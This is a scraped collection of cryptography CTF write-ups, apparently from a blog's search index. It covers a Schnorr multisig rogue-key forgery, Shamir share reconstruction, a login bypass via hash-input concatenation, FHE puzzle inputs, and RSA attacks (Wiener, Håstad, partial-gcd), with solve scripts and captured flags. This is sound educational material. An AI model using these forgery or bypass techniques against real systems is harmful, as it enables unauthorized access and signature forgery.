sum of the individual public keys in the above list In trying to generate a forgery, you may interact with the honest signer by calling public methods as much as you want; however, to make this attack realistic, you&#39;re NOT allowed to: - Access private fields of the honest signer - Ask the honest signer to generate a partial signature on the same (pubkeys, msg) pair as the forgery you output Hopefully these restrictions are obvious and sensible; otherwise the challenge would be trivial. Good luck! &quot;&quot;&quot;SOLUTIONSo we have already seen how schnorr verification works for mutisignature now lets look at the custom implemetation of schnorr from naive_multisig.pyAnalysing the class NaiveMultisigSignerclass NaiveMultisigSigner: def __init__(self, seckey=None): if seckey is None: seckey = secrets.token_bytes(32) self.seckey = seckey self.pubkey = pubkey_gen(self.seckey) self.seen_queries = set() def get_pubkey(self): return self.pubkey def gen_partial_pubnonce(self): self.secnonce = secrets.token_bytes(32) return pubkey_gen(self.secnonce) def gen_partial_sig(self, pubkeys, aggnonce, msg): assert pubkey_gen(self.seckey) in pubkeys assert len(aggnonce) == 33 assert len(msg) == 32 X = xonly_point_agg(pubkeys) R = point_from_cbytes(aggnonce) r1 = xonly_int(self.secnonce, R) x1 = xonly_int(self.seckey, X) agg_pubkey = bytes_from_point(X) e = int_from_bytes(tagged_hash(&quot;BIP0340/c;hallenge&quot;, bytes_from_point(R) + agg_pubkey + msg)) % n self.seen_queries.add((agg_pubkey, msg)) return bytes_from_int((r1 + e * x1) % n)So we can see that for each class object created it is assigned with a public Key and a public nonce commitment value which can be acessed by anyone.The gen_partial_sig takes 3 arguements with pubkeys and nonce as lists and the msg in bytes.On line 28 the code: self.seen_queries.add((agg_pubkey, msg)) this means an object can sign a particular message only once with its private key as its recorded.Now looking at the test_forgery() function:def test_forgery(): honest_signer = NaiveMultisigSigner() msg = b&#39;send all of Bob\\&#39;s coins to Alice&#39; pubkeys, sig = forge_signature(honest_signer, msg) agg_pubkey = bytes_from_point(xonly_point_agg(pubkeys)) assert honest_signer.get_pubkey() in pubkeys assert (agg_pubkey, msg) not in honest_signer.seen_queries assert schnorr_verify(msg, agg_pubkey, sig) print(&quot;sucess!!&quot;)So from the first 2 assert functions we can get that the list of public keys should include the honest signers key and honest signer cannot sign the msg so inside the forge_signature we need to create another class object which will forge the signature acessing only the public parameters of honest signer.TO achive this we need the verification service to think the aggregate public key and nonce of the multisignature came from only one signer.This is achieved via the Rogue Key Attack. This is an attack vector that can be exploited in such implementations of schnorr multisignature where the an attacker who is part of the group creating the multisignature could claim a false Public Key, and control the Multi-Sig.The following steps describe the attack: honest_signer and forged_signer take part in a 2 party multisig.$(k_h,P_h)\\quad :honest_signer \\;key \\;pair \\;(PrivateKey,PublicKey)$$(k_f,P_f)\\quad :forged_signer \\;key \\;pair \\;(PrivateKey,PublicKey)$$P_{agg} \\quad :Aggregate \\;of \\;public \\;keys \\;(P_h+P_f) $$R_{agg} \\quad :Aggregate \\;of \\;private \\;nonces \\;(R_h+R_f) $$r_{agg} \\quad\\; :x \\;cordinate \\;of R_{agg}$ Now forged_signer can send a false public key $P_{false}$ to add to the list such that resulting aggregate public key is forged_signer public key.$P_{false} = P_f - P_h$ forged_signer broadcasts $P_{false}$ as his public key:$P_{agg} = P_h + P_{false}$$P_{agg} = P_h + (P_f - P_h)$$P_{agg} = P_f$ Since the aggregate key is now forged_signer true public key, forged_signer effectively controls the multi-sig. The same procedure is done to generate the public nonce $R_{agg}$$R_{false} = R_f - R_h$$P_{agg} = R_h + R_{false}$$R_{agg} = R_h + (R_f - R_h)$$R_{agg} = R_f$ Now anyone any message signed with these parametrs is effictively signed only by forged_signer.IMPLEMENTATIONdef forge_signature(honest_signer, msg): forged_signer = NaiveMultisigSigner() X1 = honest_signer.get_pubkey() X2 = forged_signer.get_pubkey() X3 = b&quot;NEG&quot;+X1 import code code.interact(local=locals()) print(&quot;exiting interactive mode!!&quot;) pubkeys = [X1, X2, X3] #print(&quot;agg key:&quot;,xonly_point_agg(pubkeys)) R1 = honest_signer.gen_partial_pubnonce() R2 = forged_signer.gen_partial_pubnonce() R3 = b&quot;NEG&quot; + R1 R = xonly_point_agg([R1, R2, R3]) # print(&quot;agg nonce:&quot;,R) aggnonce = cbytes_from_point(R) sf = forged_signer.gen_partial_sig(pubkeys, aggnonce, msg) sig = bytes_from_point(R) + sf return pubkeys, sig Here $X_3$ is the negetive of honest_signer public key $X_1$.On additionthe resultant will be $X_2$ which is forged_signer pub key.Since in ECC there is no negetive as all values are in a fine field negetive points on ECC are represented simply by taking the complement of the $y$ cordinates i.e if $(x,y)$ is a point on the curve its negetive $-(x,y)$ is simply $(x,p-y)$ where $p$ refers to the finite fields size.MITIGATIONSo to avoid this attack we would need to verify each persons public key with a message signed by the private key, But this would require each member of the multi-sig to do this thereby nullifying the scaling and efficiency of schnorr multisig scheme.To solve this a new scheme was developed called the Bellare-NevenBellare-Neven Schemein this scheme initially everyone shares their public key and a hash of the aggregated key is taken:signing\\[\\ell = Hash(P_{agg})\\]\\[a_i = Hash(\\ell||P_i)\\]\\[P = \\sum a_iP_i\\]\\[R_{agg} = \\sum R_i\\]\\[e = Hash(R||P||m)\\] Individual contribution to signature:$s_i = z_i + k_ia_ie$ Final aggregated signature is as usual:$S = \\sum s_i$verification$SG = R+eP$ proof:\\[SG = \\sum s_i G\\]\\[= (z_i + k_ia_ie)G\\]\\[= \\sum z_iG + e\\sum k_ia_iG\\]\\[= \\sum R_i + e\\sum P_ia_i\\]\\[= R + eP\\]Now trying the key cancellation attack on this scheme we can proove that this is secure against such attacks… Taking 2 party eg with honest_signer and forged_signer…$P_{false} = P_f - P_h$$R_{false} = R_f - R_h$ This leads to both of them calculating the following “shared” values:\\[\\ell = Hash(P_h||P_{false})\\]\\[a_h = Hash(\\ell||P_h)\\]\\[a_{false} = Hash(\\ell||P_{false})\\]\\[P = a_{false}P_{false} + a_hP_h\\]\\[R = R_h + R_{false} = R_f\\]\\[e = Hash(R||P||m)\\] forged sign is calculated as:$s_f = z_f + k_se$ To get the correct mulsig$s_fG = R + eP$ Proving it wrong:\\[(z_f + k_se)G = R_f + e(a_{false}P_{false} + a_hP_h)\\]\\[R_f + k_seG = R_f + e(a_{false}P_f - a_{false}P_h + a_hP_h) \\tag{$R_f$ is common}\\]\\[k_sGe = ea_{false}P_f - ea_{false}P_h + ea_hP_h \\tag{$e$ is common}\\]\\(k_sG = (a_{false}k_f - a_{false}k_h + a_hk_h)G \\tag{$G$ is common}\\)\\[k_s = a_{false}k_f - a_{false}k_h + a_hk_h\\]hence we can see we do not have al the information to get the value on the RHS hence the forged signature cannot be calculated and attack is mitigated.Wallet Key ReconstructionCHALLENGEShares:(1, 0xB4EB3F62388EA2343FFC28BB342D4245E9C8B3B0602825235460DD74F0D47AB1)(3, 0xBE3A9EC4C3D5FA291CAFBB54C5F0301F29FE14539575408B57F3CF6C0EA6399E)(4, 0x760E31377BF2240AD9DA8A9843FF4B27A0D42F66DF029BF06A8F584FA008EA4D)The code used to generate the shares is as follows:import secrets# Arbitrary upper boundMAX_SHARES = 32# Order of secp256k1 elliptic curvep = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141R.&amp;lt;x&amp;gt; = PolynomialRing(FiniteField(p))def sss_get_shares(D, k, n): &quot;&quot;&quot; Splits the secret value D into n shares; k of n are needed to reconstruct the secret. D is a 256-bit integer in [0, p) &quot;&quot;&quot; assert 0 &amp;lt;= D &amp;lt; p assert 1 &amp;lt; k &amp;lt;= n &amp;lt;= MAX_SHARES q = D for i in range(1, k): a_i = secrets.randbelow(int(p)) q += a_i * x^i return [(i, q(i)) for i in range(1, n + 1)]SOLUTION / IMPLEMENTATIONThis was an easier challenge compared to the last one based on shamirs secret sharing schemeSolve script:from libnum import *p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141shares = [(1, 0xB4EB3F62388EA2343FFC28BB342D4245E9C8B3B0602825235460DD74F0D47AB1),(3, 0xBE3A9EC4C3D5FA291CAFBB54C5F0301F29FE14539575408B57F3CF6C0EA6399E), (4, 0x760E31377BF2240AD9DA8A9843FF4B27A0D42F66DF029BF06A8F584FA008EA4D) ]res = 0for i, pair in enumerate(shares): x, y = pair top = 1 bottom = 1 for j, pair in enumerate(shares): if j == i: continue xj, yj = pair top = (top * (-xj)) % p bottom = (bottom * (x - xj)) % p res += (y * top * invmod(bottom, p)) % p res %= pflag = n2s(int(res))print(flag)#flag = correct! see you in the citadelsCONCLUSIONI would really like to thank Elliot for making this amazing set of challenges while solving these I manged to learn a lot and all though there was some concepts I already knew I came across many new topics, some totally unrelated to the exploit for the challenges like the use of EC-schnorr in bitcoin, creating adresses in bitcoin, how to mitigate such attacks. Also came across a lot of papers and got to know about a lot more attacks/shortcomings of ECDSA/schnorr algorithms and how to correct them and their implementations in the bitcoin block chain." }, { "title": "Login - Fword CTF 2021", "url": "/posts/Login-Fword_21/", "categories": "CTF-Wrtieups", "tags": "FwordCTF, Hash-extension, RSA-Signature", "date": "2021-08-31 20:30:06 +0800", "snippet": " tl;dr use hash extension to bypass password check on login. use RSA properties to recover $q$ and get $p$ and therefore $N= p*q$. sign the message given, and get the flag.Challenge Points: 900Challenge Solves: ~20Challenge Descriptiontry to login to this service.Initial AnalysisWe are provided with an nc service with the following three options Sign up Login Leavea) Sign upThis asked us for a username following which a password would be generated password consisted of three parts each seperated by a ; whose sha256 hash was takenpasswd = H(server_token + b&#39;;&#39; + user + b&#39;;&#39; + proof) server_token: random 16 byte string user: username over which the user had control over proof: value of this was initially set to is_admin=falseafter sign up user would get $username$ , $password$ and $proof$ valuesb) Loginon Login user would have to input the values of $username$,$password$ and $proof$.the password value is checked with the hash of secret token and $user$ and $proof$ values which you entered.if it is correct u move on to next stageLogin checkthe 3 values which you enter on login: $username$, $password$ and $proof$are used for the first check if password == H(server_token + b&#39;;&#39; + username + b&#39;;&#39; + proof): if b&#39;is_admin=true&#39; in proof: return Truehere the hash is calulated by using sha256.And we need is_admin=true in $proof$ but on signup $proof$ is initialised with is_admin=falsea) Intended solutionthe intended way here is to append the data is_admin=true to $proof$ and generate a hash which satisfies this new data. This can be achived by hash extension attack using this tool.b) Unintended solutionInstead of going though with implementation of hash extension there is way more simpler solution to this. If we look at the login part where the 2 if conditions are present we see the second if condition only checks for if the string is_admin=true is present in $proof$. But we see that $proof$ is initialised with is_admin=false in the begining itself.Also we notice we have control over username and the value assigned to proof in the login function. So the idea here is to initially generate a password that will pass the first if condition and contain the desired proof value.Since on sign up we do not have acess to proof we use username itself to assign the value of $proof$.confusing…….well the idea is to match the password hash and that proof should contain the desired value. For this to work we use the fact that the hash is calculated by adding the strings together it doesnt matter wherse a string is placed as long as on adding all the strings we get the same final string and hence the same hash.So in sign up we fill in the desired value of proof in username field itself like so`username = ‘a;is_admin=true’`so now password hash is:passwd = H(server_token + b&#39;;&#39; + b&#39;a;is_admin=true&#39; + b&#39;;&#39; + b&#39;is_admin=false&#39;)Now on sign up we have control over bothe username and proof fieldsSo we give username as a and proof as is_admin=true;is_admin=falsepasswd = H(server_token + b&#39;;&#39; + b&#39;a&#39; + b&#39;;&#39; + b&#39;is_admin=true;is_admin=false&#39;)so the password hash is same as what we get after sign up but this time the desired vaue is there in proof instead of username hence we pass the checkSigningto pass this we need to correctly sign this message_to_sign = b&quot;https://twitter.com/CTFCreators&quot;since the server gives us $e$ and $d$ we can easily get the correct signature only problem is we dont have modulus instea we have $pinv \\equiv p^{-1} \\bmod\\ q$we know this rsa formula $ed = 1 + k*(p-1)(q-1)$ from this we see $k$ will have same bit size as e and so it can be bruteforced hence we can assume we have $\\phi(n) = (p-1)(q-1)$also we have $p^{-1}p \\equiv 1\\bmod\\ q$writing $\\phi(n)$ in terms of $ \\bmod\\ q$ we get $\\phi(n) \\equiv -(p-1) \\bmod\\ q$from these 2 observatoins we get $1 + pinv*\\phi(n) - pinv \\equiv 0 \\bmod\\ q$ ,after substituting $p$ in the equation.$i.e$ LHS of the above equation is a multiple of $q$from fermats little theorem for some $a$ we get $a^{\\phi(n)} - 1 \\equiv 0 \\bmod\\ p*q$so we have another multiple. Taking the gcd of these two will get us the value of $q$ after which we get $p$ and so we have $N = p*q$ and we can easily generate a valid sign for the given message!!" }, { "title": "Encrypted Operations - InCTF Internationals 2021", "url": "/posts/Encrypted-Operations-InCTFi21/", "categories": "CTF-Wrtieups", "tags": "InCTFi", "date": "2021-08-20 20:30:06 +0800", "snippet": " tl;dr Multiplying the middle element of 3x3 matrix with 9 gets thesum of all elements. Adding the least element of 5x4 matrix with the larget and multiplying this result by 10 gets the sum of all elements. multiplying any row with 2000 and subtrating that number by 2 will get you the sum. Remaing two rows can be filled with the result of subtracting 9 from each digit of a corresponding row .Challenge Points: 823Challenge Author: stryd3rChallenge Descriptionlets see how good you are at performing blind operations.OverviewWe are provided with 2 files in c++. level.cpp has two functions level1() and level2() utils.cpp This contains some standard utility functions for parsing converting and encryption and decryption methods for FHE. From the challenge description given in level.cpp and briefly going through both the levels we can assume that we need to work on encrypted data throughout performing certain set of operations on it such that the decrypted value will pass some checks.Lets analyse both the level functions one by one….The Approach1. Analysing level1()a) Level 1 - Part 1Looking at this function we see in the begining a $20×20$ square matrix is being generated int SIZE = 20; int val = Genrand(1,500,0); std::vector&amp;lt;std::vector&amp;lt;int&amp;gt; &amp;gt; m(SIZE, std::vector&amp;lt;int&amp;gt;(SIZE)); std::vector&amp;lt;std::vector&amp;lt;int&amp;gt; &amp;gt; v(169, std::vector&amp;lt;int&amp;gt;(9)); std::vector&amp;lt;int&amp;gt; mat; for(int x = 0; x &amp;lt; SIZE; x++){ for(int y = 0; y &amp;lt; SIZE; y++){ m[x][y] = ++val; } }We can see that a number is chosen randomly between $1$ and $500$ and that consequently is incremented by one resulting in $400$ consecuitve values with the random number being the initial state. All these $400$ values make up the $20×20$ matrix.Moving on we see a bunch of for loops and allthough it might seem a bit complicated, simply executing this on any matrix and comparing the output with the original matrix values will tell us this is basically a collection of submatrices of the form $3×3$ that can be generated from the original matrix. int d = m.size(); int r = 3; int c = 3; for (int i = 0; i &amp;lt; d-r+1; i++) { for (int j = 0; j &amp;lt; d-c+1; j++) { for (int p = 0; p &amp;lt; r; p++) { for (int q = 0; q &amp;lt; c; q++) { mat.push_back(m[i+p][j+q]); } } } }Now we come to the first challenge. Looking at the below code snippet… idx = Genrand(0,v.size()-1,0); std::vector&amp;lt;int64_t&amp;gt; temp2(begin(v[idx]), end(v[idx])); msgvector = temp2; FheEncrypt(msgvector);here the plaintext vector which is encrypted by FHE is a $3×3$ sub matrix which is randomly chosen from the above list of submatrices. We can look at the check in the if condition —–&amp;gt; if (p[0] == sum) std::cout&amp;lt;&amp;lt;&quot;Seems like you got a hang of this!!\\nCongrats on completing the first level.\\nGo get the flag!&quot;; else exit(0);So we somehow need to make the first element of the plaintext vector p contain the sum of all elements in the randomly chosen $3×3$ sub matrix.The server lets us pass a long int vector which we can create. we see the following operations are possible: Adiition (+) Multiplication (*) Vector Shift ( samt [int] -&amp;gt; shift amount ) left shift (&amp;lt;) right shift (&amp;gt;) So here the trick is to basically multiply the middle number of the $3\\times3$ sub matrix with 9 and then do left shift 4 times to bring that number in 0th index of the vector!The following set of input when sent to the corresponding prompts in the server will clear the first check in level 1: {0,0,0,0,9,0,0,0,0}     any vector with middle element with 9 * 1 y {0}    any vector &amp;lt; 4 nNow onto the second part of level 2.b) Level 1 - Part 2If you look at the code you will notice it is litrally a copy paste of the part 1 code. only difference is in the initial value assigned to matrix variables. DIFFERENCE: &amp;gt; part 1 r = 3; c = 3; &amp;gt; part 2 r = 5; c = 4;So here the sub matrices generated are of dimension $5×4$ instead of $3×3$ as in part 1.sum of such a matrix can be calculated by $(first element + last element)\\times10$we need at least one element either first or last to do this below we recover the first element:But there is one difference this time. a function which calculates a determinant is called twice and the resultant value is multiplied with the first element of $5\\times4$ matrix, $num$calc_determinant(a, 2 * x) - calc_determinant(a, x);gen_hint(a, x);cout &amp;lt;&amp;lt; &quot;This might make it easier: &quot; &amp;lt;&amp;lt; res * num &amp;lt;&amp;lt; &quot;\\n\\n&quot;;A gen_hint() function is called with the variables used in the determinant and we are allowed to perforem some operations on these variables.if we take $g(x)$ as the function which calculates the determinant ($a$ is a constant) then $g(x) = a(a+x)^{2}$ (reducing eqn in calc_determinant())so $g(2x) - g(x) = a(a+2x)^{2} - a(a+x)$which gives $ax(2a+3x)$in gen_hint() we see $hint*ax$ so we need hint to be $(2a+3x)$ we give the following inputs: {2 3} * 1 nand for choice we give ‘+’now we have $hint = ax(2a+3x)$ and we have $ax(2a+3x)*num$ ( $num$ being first element of $5\\times4$ matrix) now dividing above two numbers we can obtain $num$Again we need the 1st element of plaintext vector to be the sum of the sub matrix elements.The following set of inputs will clear the part 2 check {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,num}     any vector with last element var1 + 1 y {0}     any vector &amp;lt; 19 y {10} * 1 n2. Analysing level2()Here we see a $5×5$ square matrix is generated initially assigned with random 1 digit values. Also the matrix index is always referenced through a randomly shuffled array containg the index values. But while assigning we notice for certain index value of the rows the whole row initialsed with $0’s$ Also note on line 3 below that matrix row indices are stored in an array which is then shuffled.```cpp= std::vector&amp;lt;std::vector &amp;gt; m1(MAT_SIZE, std::vector(MAT_SIZE));std::vector&amp;lt;int&amp;gt; row = {0,1,2,3,4};std::random_device rd;std::mt19937 g(rd()); std::shuffle(row.begin(), row.end(), g); std::cout &amp;lt;&amp;lt;&quot;\\n\\n--------LEVEL2---------\\n\\n&quot;;for(int x = 0; x &amp;lt; MAT_SIZE; x++){ for(int y = 0; y &amp;lt; MAT_SIZE; y++){ if((x==row[0])||(x==row[1])) m1[x][y] = 0; else m1[x][y] = Genrand(LOW,HIGH,0); }} ```Right after generation a row of the matrix is encrypted and we are again provided with the three usual prompts.Since we have not yet come across any check lets continue going through the code till we do.Continuing through the code we come across two encryptions and both are encrypting an unknown (but distinct) row of the matrix and the reulting plaintext which is decrypted after the operations are performed on it is then added to the matrix rather a row is modified so that the new values of the row are the values of the plaintext vector. And the rows being modified are the ones which were earlier assigned with 0’s.After modifying the matrix we see that the matrix row’s are basically being converted from 5 independent vectors to 5 numbers consisting of 5 digitsso from ecah row we are parsing a 5 digit number and consequently we can see that all these numbers are added and their sum is stored. for (int i = 0; i &amp;lt; 5; i++) if(i == row[1]) numVec.push_back(VecToNum(p1)); else if(i == row[0]) numVec.push_back(VecToNum(p2)); else numVec.push_back(VecToNum(m1[i])); long int sum = accumulate(numVec.begin(), numVec.end(), 0);Now we come to the final check ——–&amp;gt; Final Check if(sum==userInp){ std::cout&amp;lt;&amp;lt;&quot;\\n\\nYou have mastered encrypted operatoins!!\\n&quot;; std::cout&amp;lt;&amp;lt;&quot;Here&#39;s the flag: inctf{l0g1c_4nd_m4th_1s_4ll_1t_t00k!!}\\n&quot;; } else{ std::cout&amp;lt;&amp;lt;&quot;That was close, great going, But no flag for you!!\\n\\n&quot;; exit(0); }Bringing all this together we finally get a idea of what is happening….A $5×5$ square matrix is generated with 2 rows intialized with null values.we are given an encrypted row to perform operations on and the resulting plaintext is stored in userinp.Next 2 rows are encrypted and the resulting plaintext is assigned to each of the 2 rows that were initialised with $0’s$ in the begining.And then all 5 rows are converted to corrsponding 5 digit numbers and their sum is taken this sum is checked with the initial userinp. A sucessfull check yeilds the flag.So the first encrypted operations part, we are basically predicting what the sum will be.And in the second part where the two rows are modifed we are basically setting those rows such that the sum will is forced to be what we predicted earlier. So to get a correct predictoin of the sum we just need two add the digit 2 at the beginng of the 5 digit number in question and subtract 2 from the last digit* Now to set the values of the row vectors such that the resulting two rows and the rest of the 3 rows add up to our predicted values we need to subtract each digit of the row or inthis case each element of the two rows with 9.* since its a $5x5$ grid and we have generated two rows subtracting the other two rows with so when you add 4 out of these 5, 5 digit numbers we basicalli and up with $99999 + 99999$ ( since each of the two rows add up to $9$) and now we are left with the 5th row. Now if we add 2 to the sum of the 4 rows ie $99999 + 1 + 99999 + 1$ we get $200000$ and add this to the 5th number and subtract two and we get the final sum off all 5 numbers and this is exactly what we are doing in the prediction step. we can also multiply the two rows with -1 and that will cancel out the result, the above method is without having any negetive digits in the vectors Final set of inputs..The following set of input when sent to the corresponding prompts in the server will clear the check in level 2: 1st set of inputs {0}     any vector will suffice &amp;gt; 1 y {2} + 1 y {0,0,0,0,0,-2} + 1 n 2nd set of inputs {-9,-9,-9,-9,-9} + 1 y {-1,-1,-1,-1,-1} * 1 n 3rd set of inputs {-9,-9,-9,-9,-9} + 0 y {-1,-1,-1,-1,-1} * 1 n ConclusionWITH THAT U HAVE PASSED ALL THREE CHECKS!!!!!!You can find the full exploit here.flag: inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!}" }, { "title": "Little Case - * CTF", "url": "/posts/Little-case/", "categories": "CTF-Wrtieups", "tags": "Crypto, RSA, Weiner, sage magic", "date": "2021-01-30 17:55:28 +0800", "snippet": "Overviewknown values:- n1 e1 c ciphertext of mesg (taken as arguement by little_tricks()) n encrypted flag returned by real_trick()n1 = 21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561e1 = 20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607c = 17653913822265292046140436077352027388518012934178497059850703004839268622175666123728756590505344279395546682262531546841391088108347695091027910544112830270722179480786859703225421972669021406495452107007154426730798752912163553332446929049057464612267870012438268458914652129391150217932076946886301294155031704279222594842585123671871118879574946424138391703308869753154497665630799300138651304835205755177940116680821142858923842124294529640719629497853598914963074656319325664210104788201957945801990296604585721820046391439235286951088086966253038989586737352467905401107613763487302070546247282406664431777475n = 22346087036331379968192118389403047568445805414881948978518580277027027486284293415097623011228506968071753709256352246733181304513713003096615266613365080909760605498017330085960699607777361429562376124376340215426398797920168016137830563564636922257215066266075494625782943973857490781916694118187094786034792437781964601089843549995939887939410763350338658901108020658475956489391300528691289604149598720803012371765770928211044755626045817053870803040863722458554924076011151695567147976903053993914859714631837755435592006986598006207692599019026644753575853382810261910332197447386727419606073948645238377595719enc_flag = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406LThere are two functions: little_trick() real_trick()So we first recover p-1 and using that information we can get encrypted flagThe Approach#1. Retrieving plittle_trick() encrypts p-1 taking it as messsage so first step is to get this decrypted and since we are give n1 (modulus) and e1 (public exponent) we can clearly see this is a direct use of Wiener’s attack Wiener’s Theorem says that Let N = pq with q &amp;lt; p &amp;lt; 2q. Let equation [] . Then given (e, n), the attacker can efficiently recover d.using a direct wieners attack on n1 and e1 we recover d1 as 36167461773898995192586226632578677184913220227461899855497899052924496298787now we can easily get both the factors of n-p = pow(c,d1,n1)+1q = n//p#2. Retrieving enc_flagnow comes the tricky part even though we have got the factors of n (modulus used to encrypt flag) we dont have any knowledge about the public exponent special which they used to encrypt the flagbut they have given us some useful info in an assert statementassert (special &amp;gt; (ord(&quot;*&quot;)*100) and gcd(special,(p-1)*(q-1))!=1 )From these checks we get that special has a lower bound of ord(&quot;*&quot;)*100 i.e 4200 and we can conclude from the second check that special and phi(p-1*q-1) have at least one common factornow to find special I used the ecm.factor() in sage to get the factors of both p-1 and q-1 since special would be a factor of p-1*q-1 one of these two.these are the factors of q-1Surprisingly many of these factors repeated for p-1 and in the end gcd of phi got me `` 23*5*89*1153*49192*4933*28439*434167*5619323since special and phi have common factors I decided to take the above factors one by and since special &amp;gt; 4200 I started with 4919 and that turned out to be correct.All we have to do now is take the root in GF(q). This is easily done with this sage functionflags = GF(q)(enc_flag).nth_root(4919,all=True)This gets us a list of possible roots and checking for the flag format in them gets us the flag*CTF{S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This}Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww" }, { "title": "Master Challenge - De1 CTF", "url": "/posts/RSA-challenge/", "categories": "CTF-Wrtieups", "tags": "Crypto, RSA", "date": "2020-05-11 17:55:28 +0800", "snippet": "OverviewThis was one of the most interesting RSA challenges that I have solve till date. There are numerous points about this challenge that makes it so intriguing and unusual one of them being the hint (I will come to that later :p)One thing you would have noticed is how it seems that most of variables which have been used in the challenge script are not even acessible to the solver.You would also notice that there are multiple ciphertexts, modlus, public exponents declared (some which we dont even know the value of).Lets list them out in the order we’ll be finding them in: P Public exponenets e1 and e2 Prime factors of n (mentioned as n12 in the data file): q1p q1q The hint The flagAll these variables might make this challenge look pretty baffling on the first glance but the key is solving it step by step getting each of the variable one(or two) at a time.So lets get those variables one at a time………The Approach#1. Retrieving pThis one was quite intuitive especially since the ciphertexts and modulus have been give in lists the lengthsof which corresponds to 4.This is just a direct implementation of Hastards broadcast attack f=lambda m,e,n,c:pow(m,e,n)==c assert(sum(map(f,[p]*4,[4]*4,n,c))==4)The above code basically checks if p4 modn == c for all 4 values of n and c(taken from the lists)Moving on to the next unknwon………#2. Retrieving e1 and e2Here is the part where we maybe slightly misled by the following lines of code:ee1 = 42ee2 = 3assert(pow(e1,ee1,n)==ce1)assert(pow(e2+tmp,ee2,n)==ce2)At first glance it looks like we can retrive e2+tmp easily since the exponent ee2=3 is small but after implementation we see that e2+tmp is pretty big and is not susceptible to small exponent attack.By thinking of small exponent attack we are on the right idea but the wrong path since this attack which is not working for ee2 actually works for ee1=42. A direct implementation gets us the value of e1.Going back to e2; since e2+tmp is really big there is no way we can directly bruteforce tha value of e2 butagain we are on the right idea but wrong way of implementation as in, instead of bruteforcing for the value directly we bruteforce to find the actul value of the ciphertext i.e the unmoded value which would be this ce2+k*n11 by iterting for different values of k and matching this with (e2+tmp)3 we canget e2. Following is the implementation of the idea: for k in range(100000): val = root(ce2+k*n11,3) if(val[1]): e2 = val[0] - tmpMoving on to stage 3…………#3 Retrieving q1p and q1qFor this there doesn’t seem to be any way in which we can exploit the implementation to obtain the cipher text with outq1p and q1q and they are the prime factors of the modulus and to obtain them the only way is factorizationSince n is too long for normal factorization we use fermats method and we immediately get both the factors.Thereafter finding hint is just elementry RSA operation.The hint as it turns out to be: orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!is pretty useless :) , still we got the factors with which we proceed to the last and final stage…………#4 Retrieving the flagThis is arguably the most difficult value to retrieve amongst all and with good reason.All though it might look like its childs play to obin the flag as we know both the fctors of the modulus p and q1 when we try decrypting we realize the flaw that is GCD(e1,(p-1)*(q1-1)) turns out to be 14 if we try with e2 weget the same result.Moment I saw this my first reaction was dividing e2 ( or e1) by 14, this gives us a GCD of 1. good! Now we find the private exponent d.NOTE: we are finding this for e/14now decrypting with this d what we get is flage1*dmod p*q1But since this d was the modular inverse of (e1/14) and not e1 what we are left with is:-&amp;gt; flag14(e1/14)dmod p*q1-&amp;gt; flag14mod p*q1 as (e2/14)*d==1Now if take the 14th root of flag we should end up with the pliantextDoing that we get flag and then we convert it to bytes and what we get is…. well its gibberish!! Meaning flag14is bigger than p*q1That means thats not the right way of doing ( again we are on the right idea but wrong track :D )so if flag power 14 is too big how about reducing the power…………Now lets take only q1 as the modulus. The idea here is that if q1 is less than p*q1 we may be able to retrieve the flagso here’s what we do:-&amp;gt; c_modq = c_flag mod q1 (c_flag referenced as c1 in challenge script)this makes some changes which we will see-&amp;gt; c_flag = flage1mod p*q1-&amp;gt; c_modq = (flage1mod p*q1)mod q1-&amp;gt; c_modq = (flage1mod q1)mod p*q1Now gcd(e2,(q2-1))=2so again we divide e2/2 and find inverse(e2/2,(q2-1)) and we get d ( for e2/2 )-&amp;gt; c_modqd = (flag2(e2/2)dmod q2)mod p*q2Hence we get (flag2mod q1)mod p*q1since q1&amp;lt;p*q1 we can ommit mod p*q1-&amp;gt; c_modqd = flag2(e2/2)dmod q1now assuming flag2&amp;lt;q1 we can get flag by taking root For all this we haven’t taken into consideration q2 as it is not greater than flag2hence will not yield the flag when we attempt to take square rootthis is the exploit script for the idea:q1 = q1pc1_modq = c_flag % q1GCD1 = gcd(e1,q1-1)d1 = invert(e1/GCD1,q1-1)c1_modq = pow(c1_modq,d1,q1)flag = root(c1_modq,2)[0]In the end we get decrypted flag as: de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}Here is the complete exploit" }, { "title": "Locked Dungeons - SWAMP CTF", "url": "/posts/Locked-Dungeons-1/", "categories": "CTF-Wrtieups", "tags": "Crypto, AES-ECB", "date": "2020-03-15 17:55:28 +0800", "snippet": "OverviewOn the first glance itself you briefly get an idea that encryption program is an implementatioin of a modified AES-ECB encryption oracle along with the standard PKCS#11 padding.Declared inside the class AESCipher we can observe the two functions which are the core part of the challenge i.e the mod_encrypt and the mod_pad functions.furthermore we observe that the user can input some values.Also notice that after the flag file is read certain conditions are being checked: Flag size should be less than 48. user can input 6400 times. user input should not be greater than 100.Further more we observe a sys call which 